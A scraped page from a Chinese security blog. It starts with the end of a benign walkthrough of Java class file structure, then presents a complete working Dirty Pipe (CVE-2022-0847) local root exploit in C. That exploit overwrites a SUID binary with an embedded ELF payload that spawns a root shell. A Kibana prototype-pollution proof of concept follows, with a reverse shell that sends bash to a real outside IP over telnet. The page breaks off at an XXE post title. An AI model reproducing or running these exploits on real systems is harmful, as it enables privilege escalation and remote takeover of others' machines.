<p>method_info {<br>  u2 access_flags;<br>  u2 name_index;<br>  u2 descriptor_index;<br>  u2 attributes_count;<br>  attribute_info attributes[attributes_count];<br>}<br>复制代码<br>access_flags表示方法的访问权限和基本属性。以下表：<br>方法access_flags表：<br>标记名	值	说明<br>ACC_PUBLIC	0x0001	public，方法能够被从任何package访问<br>ACC_PRIVATE	0x0002	private，方法只能够被该类自身访问<br>ACC_PROTECTED	0x0004	protected，方法能够被子类访问<br>ACC_STATIC	0x0008	static，静态方法<br>ACC_FINAL	0x0010	final，方法不能被重写<br>ACC_SYNCHRONIZED	0x0020	synchronized，方法加同步<br>ACC_BRIDGE	0x0040	bridge，方法由编译器生成<br>ACC_VARARGS	0x0080	方法有可变参数<br>ACC_NATIVE	0x0100	native，方法引用非Java语言的本地方法<br>ACC_ABSTRACT	0x0400	abstract，抽象方法<br>ACC_STRICT	0x0800	strictfp，方法使用FP-strict浮点格式<br>ACC_SYNTHETIC	0x1000	方法在源文件中不出现，由编译器产生<br>name_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示方法的非全限定名或者初始化方法的名字(<init>或<clinit>方法)。<br>descriptor_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示方法的描述符。<br>attributes_count和attributes分别表示方法附加属性的计数器和附加属性表。<br>这里分析第一个方法。方法计数器0x0004以后，是第一个方法的access_flags，值为0x0001，表示public类型。接下来是name_index，值为0x0001，指向常量池索引为1的项，该项表示的是java&#x2F;lang&#x2F;Object.”<init>“:()V方法。接下来是descriptor_index，值为0x000a，指向常量池索引为10的项，表示方法的非全限定名。接下来是attributes_count，值为0x000b，表示有11个附加属性，以后是这11个附加属性的数据，包含code和操做符，这里不在展开，以后会专门写解析的内容。</p>
<p>#1 &#x3D; Methodref #7.#20 &#x2F;&#x2F; java&#x2F;lang&#x2F;Object.”<init>“:()V<br>#7 &#x3D; Class #28 &#x2F;&#x2F; java&#x2F;lang&#x2F;Object<br>#10 &#x3D; Utf8 <init><br>#11 &#x3D; Utf8 ()V<br>#20 &#x3D; NameAndType #10:#11 &#x2F;&#x2F; “<init>“:()V<br>#28 &#x3D; Utf8 java&#x2F;lang&#x2F;Object<br>复制代码</p>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>这里主要记录文件的属性。有属性计数器attributes_count和属性表attributes。<br>本例class文件中，attributes_count值为0x0001，表示有一个属性。属性表中的每一项都常量池中的一个索引，该索引处的格式为：</p>
<p>attribute_info {<br>  u2 attribute_name_index;<br>  u4 attribute_length;<br>  u2 source_file_index;<br>}<br>复制代码<br>attribute_name_index的值为0x0012，指向索引为18的常量池的项，该项是一个CONSTANT_Utf8_info结构，表示“SourceFile”。而后是attribute_length的值为0x00000002，表示紧跟其后的有2个字节，source_file_index值为0x0013，指向索引为19的常量池项，该项是一个CONSTANT_Utf8_info结构，表示“HelloWorld.java”。至此class文件简单分析完毕。</p>
<p>#18 &#x3D; Utf8 SourceFile<br>#19 &#x3D; Utf8 HelloWorld.java<br>复制代码</p>
<h2 id="附class文件结构备注"><a href="#附class文件结构备注" class="headerlink" title="附class文件结构备注"></a>附class文件结构备注</h2><p>魔数:<br>cafe babe </p>
<p>副版本号和主版本号:<br>0000 0034 </p>
<p>常量池：<br>0023 0a00 0700 140a<br>0006 0015 0900 1600 1709 0006 0018 0a00<br>1900 1a07 001b 0700 1c01 0003 6162 6301<br>0001 4901 0006 3c69 6e69 743e 0100 0328<br>2956 0100 0443 6f64 6501 000f 4c69 6e65<br>4e75 6d62 6572 5461 626c 6501 0004 6d61<br>696e 0100 1628 5b4c 6a61 7661 2f6c 616e<br>672f 5374 7269 6e67 3b29 5601 0008 7072<br>696e 7441 4243 0100 083c 636c 696e 6974<br>3e01 000a 536f 7572 6365 4669 6c65 0100<br>0f48 656c 6c6f 576f 726c 642e 6a61 7661<br>0c00 0a00 0b0c 0010 000b 0700 1d0c 001e<br>001f 0c00 0800 0907 0020 0c00 2100 2201<br>0017 636f 6d2f 7868 2f68 656c 6c6f 2f48<br>656c 6c6f 576f 726c 6401 0010 6a61 7661<br>2f6c 616e 672f 4f62 6a65 6374 0100 106a<br>6176 612f 6c61 6e67 2f53 7973 7465 6d01<br>0003 6f75 7401 0015 4c6a 6176 612f 696f<br>2f50 7269 6e74 5374 7265 616d 3b01 0013<br>6a61 7661 2f69 6f2f 5072 696e 7453 7472<br>6561 6d01 0007 7072 696e 746c 6e01 0004<br>2849 2956 </p>
<p>访问标记符:<br>0021 </p>
<p>类在常量池中的索引:<br>0006<br>父类在常量池中的索引:<br>0007<br>接口索引计数器:<br>0000 </p>
<p>字段索引计数器:<br>0001<br>第一个字段field_info:<br>000a access_flags<br>0008 name_index<br>0009 descriptor_index<br>0000 附加属性</p>
<p>方法计数器:<br>0004<br>方法表:<br>0001 000a 000b 0001<br>000c 0000 001d 0001 0001 0000 0005 2ab7<br>0001 b100 0000 0100 0d00 0000 0600 0100<br>0000 0300 0900 0e00 0f00 0100 0c00 0000<br>2000 0000 0100 0000 04b8 0002 b100 0000<br>0100 0d00 0000 0a00 0200 0000 0700 0300<br>0800 0a00 1000 0b00 0100 0c00 0000 2600<br>0200 0000 0000 0ab2 0003 b200 04b6 0005<br>b100 0000 0100 0d00 0000 0a00 0200 0000<br>0b00 0900 0c00 0800 1100 0b00 0100 0c00<br>0000 1e00 0100 0000 0000 0610 7bb3 0004<br>b100 0000 0100 0d00 0000 0600 0100 0000<br>04</p>
<p>属性计数器:<br>00 01<br>第一个属性:<br>00 12 attribute_name_index<br>00 0000 02 attribute_length<br>00 13 source_file_index<br>复制代码</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>The Java Virtual Machine Instruction Set<br>《Java虚拟机规范》</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/Linux-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2022-0847/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/Linux-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2022-0847/" class="post-title-link" itemprop="url">Linux 本地权限提升漏洞 CVE-2022-0847</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:02:16 / 修改时间：10:02:24" itemprop="dateCreated datePublished" datetime="2024-09-10T10:02:16+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// dirtypipez.c</span><br><span class="line">//</span><br><span class="line">// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn</span><br><span class="line">// a root shell. (and attempts to restore the damaged binary as well)</span><br><span class="line">//</span><br><span class="line">// Wow, Dirty CoW reloaded!</span><br><span class="line">//</span><br><span class="line">// -- blasty &lt;peter@haxx.in&gt; // 2022-03-07</span><br><span class="line"></span><br><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">// small (linux x86_64) ELF file matroshka doll that does;</span><br><span class="line">//   fd = open(&quot;/tmp/sh&quot;, O_WRONLY | O_CREAT | O_TRUNC);</span><br><span class="line">//   write(fd, elfcode, elfcode_len)</span><br><span class="line">//   chmod(&quot;/tmp/sh&quot;, 04755)</span><br><span class="line">//   close(fd);</span><br><span class="line">//   exit(0);</span><br><span class="line">//</span><br><span class="line">// the dropped ELF simply does:</span><br><span class="line">//   setuid(0);</span><br><span class="line">//   setgid(0);</span><br><span class="line">//   execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], [NULL]);</span><br><span class="line">unsigned char elfcode[] = &#123;</span><br><span class="line">	/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,</span><br><span class="line">	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,</span><br><span class="line">	0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,</span><br><span class="line">	0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,</span><br><span class="line">	0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,</span><br><span class="line">	0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,</span><br><span class="line">	0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,</span><br><span class="line">	0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,</span><br><span class="line">	0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,</span><br><span class="line">	0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">	if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">	static char buffer[4096];</span><br><span class="line"></span><br><span class="line">	/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		write(p[1], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">	   leaving the flags initialized) */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		read(p[0], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the pipe is now empty, and if somebody adds a new</span><br><span class="line">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">	   will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int hax(char *filename, long offset, uint8_t *data, size_t len) &#123;</span><br><span class="line">	/* open the input file and validate the specified offset */</span><br><span class="line">	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">	if (fd &lt; 0) &#123;</span><br><span class="line">		perror(&quot;open failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	struct stat st;</span><br><span class="line">	if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(&quot;stat failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* create the pipe with all flags initialized with</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">	int p[2];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	/* splice one byte from before the specified offset into the</span><br><span class="line">	   pipe; this will add a reference to the page cache, but</span><br><span class="line">	   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">	--offset;</span><br><span class="line">	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;splice failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if (nbytes == 0) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the following write will not create a new pipe_buffer, but</span><br><span class="line">	   will instead write into the page cache, because of the</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	nbytes = write(p[1], data, len);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;write failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if ((size_t)nbytes &lt; len) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	if (argc != 2) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Usage: %s SUID\n&quot;, argv[0]);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char *path = argv[1];</span><br><span class="line">	uint8_t *data = elfcode;</span><br><span class="line"></span><br><span class="line">	int fd = open(path, O_RDONLY);</span><br><span class="line">	uint8_t *orig_bytes = malloc(sizeof(elfcode));</span><br><span class="line">	lseek(fd, 1, SEEK_SET);</span><br><span class="line">	read(fd, orig_bytes, sizeof(elfcode));</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] hijacking suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] dropping suid shell..\n&quot;);</span><br><span class="line">	system(path);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] restoring suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n&quot;);</span><br><span class="line">	system(&quot;/tmp/sh&quot;);</span><br><span class="line"></span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/kibana%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/kibana%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">kibana远程代码执行漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:00:37 / 修改时间：11:38:01" itemprop="dateCreated datePublished" datetime="2024-09-10T10:00:37+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;rm -f tmp/.a;mknod /tmp/.a p &amp;&amp; telnet 42.193.253.66 7122 0&lt;/tmp/.a|&amp; /bin/bash &gt;&amp; /tmp/.a;rm -f /tmp/.a&quot;);process.exit()//&#x27;).props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/blog/94b32099dabeb9da68f183f89c31b945.png"></p>
<p>然后点击Canvas即可实现反弹<br><img src="/images/blog/6403360132a89d61dcfe13bf63a42b36.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">xxe漏洞利用</a>
